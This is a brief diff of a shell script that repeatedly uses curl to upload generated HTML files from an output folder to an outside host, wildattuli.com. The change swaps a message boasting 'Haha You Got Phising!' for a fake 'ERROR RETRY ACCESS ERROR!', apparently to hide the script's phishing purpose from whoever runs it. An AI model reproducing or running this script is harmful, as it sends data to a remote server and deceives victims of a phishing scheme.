@@ -48,4 +48,4 @@ curl -T output/fuck7.html http://wildattuli.com
 curl -T output/fuck8.html http://wildattuli.com
 curl -T output/fuck9.html http://wildattuli.com
 curl -T output/fuck0.html http://wildattuli.com
-echo '[+] Haha You Got Phising!';
+echo '[+] ERROR RETRY ACCESS ERROR!';
